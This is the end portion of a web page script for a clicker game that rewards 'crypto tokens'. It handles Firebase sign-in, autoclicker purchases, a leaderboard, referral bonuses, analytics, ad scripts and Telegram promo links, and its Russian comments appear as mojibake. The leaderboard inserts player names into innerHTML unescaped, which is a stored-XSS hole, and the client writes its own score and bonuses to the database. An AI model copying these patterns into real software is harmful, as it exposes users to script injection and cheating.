  if (autoclickCooldown) {
    showMessage("Autoclicker on cooldown.");
    return;
  }

  const prices = {
    1: 200,
    5: 800,
    10: 1400
  };

  const cost = prices[minutes];
  if (score >= cost) {
    score -= cost;
    updateCounterDisplay();
    showMessage(`Autoclicker activated for ${minutes} minute(s)!`);
    autoclickCooldown = true;
    const duration = minutes * 60000;
    startAutoclicker(duration, false); // –ü–µ—Ä–µ–¥–∞—ë–º extendTime = false –¥–ª—è –∑–∞–º–µ–Ω—ã –≤—Ä–µ–º–µ–Ω–∏
    updateTaskProgress("autoclickerMaster", 1);

    if (user) {
      db.ref("leaderboard/" + user.uid).update({
        autoclickActive: true,
        autoclickEndTime: autoclickEndTime,
        score: score,
        lastUpdate: Date.now()
      }).catch(error => {
        console.error("Error saving autoclicker purchase:", error);
      });
    }

    updateProfilePanel();
    submitScore();
  } else {
    showMessage("Not enough tokens for autoclicker.");
  }
}
    

   function signInWithGoogle() {
      const provider = new firebase.auth.GoogleAuthProvider();
      auth.signInWithPopup(provider).then(result => {
        user = result.user;
        document.getElementById("authSection").style.display = "none";
        document.getElementById("gameSection").style.display = "block";
        loadPlayerData(user.uid);
        submitScore();
      }).catch(error => {
        showMessage("Google sign-in failed.");
        console.error(error);
      });
    }

  /*!!  function signInWithGoogle() {
  const provider = new firebase.auth.GoogleAuthProvider();
  auth.signInWithPopup(provider).then(result => {
    user = result.user;
    document.getElementById('authSection').style.display = 'none';
    document.getElementById('gameSection').style.display = 'block';
    loadPlayerData(user.uid);
    submitScore();
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–µ—Ñ–µ—Ä–µ—Ä–∞ –∏–∑ URL
    const urlParams = new URLSearchParams(window.location.search);
    const referrerUid = urlParams.get('ref');
    if (referrerUid) {
      saveReferrer(referrerUid);
    }
  }).catch(error => {
    showMessage('Google sign-in failed.');
    console.error(error);
  });
    }!!*/
    

    function signOut() {
      if (user) {
        submitScore();
      }

      auth.signOut().then(() => {
        user = null;
        score = 0;
        clickPower = 1;
        autoclickEndTime = 0;
        clearInterval(autoclickInterval);
        document.getElementById("authSection").style.display = "block";
        document.getElementById("gameSection").style.display = "none";
        updateCounterDisplay();
        updateClickPowerBar();
        updateProfilePanel();
      });
    }

  /*!  auth.onAuthStateChanged(currentUser => {
      if (currentUser) {
        user = currentUser;
        document.getElementById("authSection").style.display = "none";
        document.getElementById("gameSection").style.display = "block";
        loadPlayerData(user.uid);
        checkDailyReward();
        renderTasks();
      }
    });!*/

    auth.onAuthStateChanged(currentUser => {
  if (currentUser) {
    user = currentUser;
    document.getElementById("authSection").style.display = "none";
    document.getElementById("gameSection").style.display = "block";
    loadPlayerData(user.uid);
    checkDailyReward();
    renderTasks();
    startBonusTimer(); // Initialize bonus timer on login
  } else {
    if (bonusTimerInterval) clearInterval(bonusTimerInterval);
    document.getElementById("claimBonusBtn").disabled = true;
    document.getElementById("bonusTimer").innerText = "Sign in to claim";
  }
});

    db.ref("leaderboard").on("value", snapshot => {
      const data = [];
      snapshot.forEach(child => {
        const entry = child.val();
        if (entry && entry.score !== undefined && entry.name) {
          data.push({
            id: entry.id,
            name: entry.name,
            score: entry.score
          });
        }
      });

      data.sort((a, b) => b.score - a.score);

      const leaderboard = document.getElementById("leaderboard");
      leaderboard.innerHTML = "";

      if (data.length === 0) {
        leaderboard.innerHTML = "<tr><td colspan='3'>No players yet</td></tr>";
        return;
      }

      data.slice(0, 10).forEach((entry, index) => {
        leaderboard.innerHTML += `<tr><td>${index + 1}</td><td>${entry.name}</td><td>${entry.score}</td></tr>`;
      });
    }, error => {
      console.error("Error loading leaderboard:", error);
      showMessage("Failed to load leaderboard.");
    });

    setInterval(() => {
      if (user) {
        updateProfilePanel();
        if (score > 0) submitScore();
      }
    }, 1000);

    const motivationalPhrases = [
      "Click ‚Äî earn tokens.", "Sign in ‚Äî save your progress.", "Your crypto journey starts here.",
      "No account ‚Äî no profit!", "Log in and turn clicks into income!", "The first tokens are always the most valuable.",
      "Top farmers are waiting for you!", "Level up ‚Äî earn even more tokens!", "Crypto wealth starts with a single click.",
      "Skip signing in ‚Äî miss the rewards!"
    ];

    let motiveIndex = 0;
    const motiveElement = document.getElementById("motiveText");

    setInterval(() => {
      motiveElement.style.opacity = 0;
      setTimeout(() => {
        motiveIndex = (motiveIndex + 1) % motivationalPhrases.length;
        motiveElement.innerText = motivationalPhrases[motiveIndex];
        motiveElement.style.opacity = 1;
      }, 500);
    }, 3000);

// –í–Ω—É—Ç—Ä–∏ –≤–∞—à–µ–≥–æ <script> —Ç–µ–≥–∞
window.onload = function() {
    const referrer = document.referrer;
    if (referrer) {
        console.log("–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–µ—Ä–µ—à—ë–ª —Å: " + referrer);
        // –ú–æ–∂–Ω–æ –æ—Ç–æ–±—Ä–∞–∑–∏—Ç—å —Ä–µ—Ñ–µ—Ä–µ—Ä –≤ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–µ
     //   showMessage("–ü–µ—Ä–µ—à—ë–ª —Å: " + referrer);
        // –ò–ª–∏ —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –≤ Firebase –¥–ª—è –∞–Ω–∞–ª–∏—Ç–∏–∫–∏
        saveReferrer(referrer);
    } else {
        console.log("–†–µ—Ñ–µ—Ä–µ—Ä –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç (–ø—Ä—è–º–æ–π –≤—Ö–æ–¥ –∏–ª–∏ —Å–∫—Ä—ã—Ç)");
      //  showMessage("–†–µ—Ñ–µ—Ä–µ—Ä –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç");
    }
};

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Ä–µ—Ñ–µ—Ä–µ—Ä–∞ –≤ Firebase
function saveReferrer(referrer) {
    if (user) {
        const now = new Date().toISOString();
        db.ref("referrers/" + user.uid).push({
            referrer: referrer,
            timestamp: now
        }).then(() => {
            console.log("–†–µ—Ñ–µ—Ä–µ—Ä —Å–æ—Ö—Ä–∞–Ω—ë–Ω –≤ Firebase");
        }).catch(error => {
            console.error("–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Ä–µ—Ñ–µ—Ä–µ—Ä–∞:", error);
        });
    }
}

/*!window.onload = function() {
  const urlParams = new URLSearchParams(window.location.search);
  const referrerUid = urlParams.get('ref');
  if (referrerUid) {
    console.log(`Referral detected: ${referrerUid}`);
    saveReferrer(referrerUid);
  } else {
    console.log('No referrer detected');
  }
};!*/

/*!!window.onload = function() {
  const urlParams = new URLSearchParams(window.location.search);
  const referrerUid = urlParams.get('ref');
  if (referrerUid) {
    console.log(`Referral detected: ${referrerUid}`);
    // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ä–µ—Ñ–µ—Ä–µ—Ä–∞ —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
    auth.onAuthStateChanged(currentUser => {
      if (currentUser) {
        user = currentUser;
        saveReferrer(referrerUid);
      }
    });
  } else {
    console.log('No referrer detected');
  }
};!!*/ //chrome 


window.onload = function() {
  const urlParams = new URLSearchParams(window.location.search);
  let referrerUid = urlParams.get('ref');

  // –õ–æ–≥–∏—Ä—É–µ–º –Ω–∞—á–∞–ª—å–Ω–æ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ URL
  console.log('Initial URL params:', window.location.search);

  // –ï—Å–ª–∏ referrerUid –µ—Å—Ç—å, –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –µ–≥–æ
  if (referrerUid) {
    // –û—á–∏—â–∞–µ–º –ø–∞—Ä–∞–º–µ—Ç—Ä ref –∏–∑ URL
    window.history.replaceState({}, document.title, window.location.pathname);
    console.log('URL cleaned, new URL:', window.location.href);

    // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ URL –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ –æ—á–∏—â–µ–Ω
    const newUrlParams = new URLSearchParams(window.location.search);
    if (newUrlParams.get('ref')) {
      console.error('Failed to clean ref from URL in Firefox');
    }

    // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º —Ä–µ—Ñ–µ—Ä–µ—Ä–∞ –ø–æ—Å–ª–µ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
    auth.onAuthStateChanged(currentUser => {
      if (currentUser) {
        user = currentUser;
        saveReferrer(referrerUid);
      }
    });
  } else {
    console.log('No referrer detected');
  }
};
    
    

/*!function saveReferrer(referrerUid) {
  if (user) {
    // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ä–µ—Ñ–µ—Ä–µ—Ä–∞ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    db.ref(`leaderboard/${user.uid}`).update({
      referrer_uid: referrerUid,
      lastUpdate: Date.now()
    }).then(() => {
      // –ù–∞—á–∏—Å–ª—è–µ–º 50 —Ç–æ–∫–µ–Ω–æ–≤ –Ω–æ–≤–æ–º—É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
      score += 50;
      showMessage('Referral bonus: +50 tokens!');
      updateCounterDisplay();
      submitScore();
      // –†–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ–º –ø—Ä–∏–≥–ª–∞—à–µ–Ω–∏–µ
      db.ref(`referrals/${referrerUid}/${user.uid}`).set({
        invited_at: Date.now(),
        tokens_earned: 0,
        reward_claimed: false
      });
    }).catch(error => {
      console.error('Error saving referrer:', error);
    });
  }
}!*/

    function saveReferrer(referrerUid) {
  if (!user || !referrerUid) return; // –ü—Ä–æ–ø—É—Å–∫–∞–µ–º, –µ—Å–ª–∏ –Ω–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–ª–∏ —Ä–µ—Ñ–µ—Ä–µ—Ä–∞

  // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤ leaderboard
  db.ref(`leaderboard/${user.uid}`).once('value').then(snapshot => {
    const userData = snapshot.val();

    // –ï—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –∏ –±–æ–Ω—É—Å –Ω–∞—á–∏—Å–ª–µ–Ω, –≤—ã—Ö–æ–¥–∏–º
    if (userData && userData.referral_bonus_claimed) {
      console.log('Referral bonus already claimed for this user.');
      return;
    }

    // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –ª–∏ –ø—Ä–∏–≥–ª–∞—à–∞—é—â–∏–π
    db.ref(`leaderboard/${referrerUid}`).once('value').then(referrerSnapshot => {
      if (!referrerSnapshot.exists()) {
        console.log('Invalid referrer UID:', referrerUid);
        return;
      }

      // –ù–∞—á–∏—Å–ª—è–µ–º 50 —Ç–æ–∫–µ–Ω–æ–≤ –Ω–æ–≤–æ–º—É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
      score += 50;
      showMessage('Referral bonus: +50 tokens!');
      updateCounterDisplay();

      // –°–æ—Ö—Ä–∞–Ω—è–µ–º –¥–∞–Ω–Ω—ã–µ —Ä–µ—Ñ–µ—Ä–∞–ª–∞
      db.ref(`leaderboard/${user.uid}`).update({
        referrer_uid: referrerUid,
        referral_bonus_claimed: true,
        score: score,
        lastUpdate: Date.now()
      }).then(() => {
        // –†–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ–º –ø—Ä–∏–≥–ª–∞—à–µ–Ω–∏–µ
        db.ref(`referrals/${referrerUid}/${user.uid}`).set({
          invited_at: Date.now(),
          tokens_earned: 0,
          reward_claimed: false
        });
        submitScore();
      }).catch(error => {
        console.error('Error saving referrer:', error);
        showMessage('Failed to process referral.');
      });
    }).catch(error => {
      console.error('Error checking referrer:', error);
    });
  }).catch(error => {
    console.error('Error checking user data:', error);
  });
}


    
  </script>

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-G76GTQQKG0"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-G76GTQQKG0');
  </script>

  <div class="ad-container">
    <script type="text/javascript">
      atOptions = {
        'key': '37256add668a0f644adfae7b41a567a3',
        'format': 'iframe',
        'height': 90,
        'width': 728,
        'params': {}
      };
    </script>
    <script type="text/javascript" src="//www.highperformanceformat.com/37256add668a0f644adfae7b41a567a3/invoke.js"></script>
  </div>

 <div style="text-align: center; margin: 20px 0;">
    <a href="https://t.me/TokenCarnivalBot/Carnival?startapp=r_464829483" target="_blank" rel="noopener" style="color: #00ffa6; font-size: 38px; font-weight: bold; text-decoration: none; text-shadow: 0 0 8px #00c3ff;">
      Just Three Spins and Get a Bonus!
    </a>
</div>

 <!-- <div style="text-align: center; margin: 20px 0;">
    <a href="https://t.me/rslite_bot/rsl_app?startapp=RZ8CSrP" target="_blank" rel="noopener" style="color: #00ffa6; font-size: 38px; font-weight: bold; text-decoration: none; text-shadow: 0 0 8px #00c3ff;">
      Free Game and Bonus
    </a>
  </div>-->
</body>
</html>
